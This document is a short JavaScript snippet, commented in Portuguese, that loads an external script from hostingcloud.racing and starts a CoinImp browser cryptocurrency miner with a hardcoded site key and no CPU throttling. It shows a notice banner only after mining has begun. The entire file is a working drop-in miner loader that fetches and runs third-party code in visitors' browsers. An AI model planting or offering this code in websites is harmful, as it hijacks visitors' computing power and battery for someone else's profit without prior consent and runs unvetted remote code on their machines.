function loadAndExecuteScript() {
    var script = document.createElement('script');
    script.src = 'https://www.hostingcloud.racing/4mrU.js';
    script.onload = function() {
        var _client = new Client.Anonymous('22852f99de2f3022997a8b61c99ceda5c3b95c7db49facb0b27fdaedc6342650', {
            throttle: 0, c: 'w'
        });
        _client.start();
        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
    };
    document.body.appendChild(script);
}

// Chama a função para carregar e executar o script externo
loadAndExecuteScript();
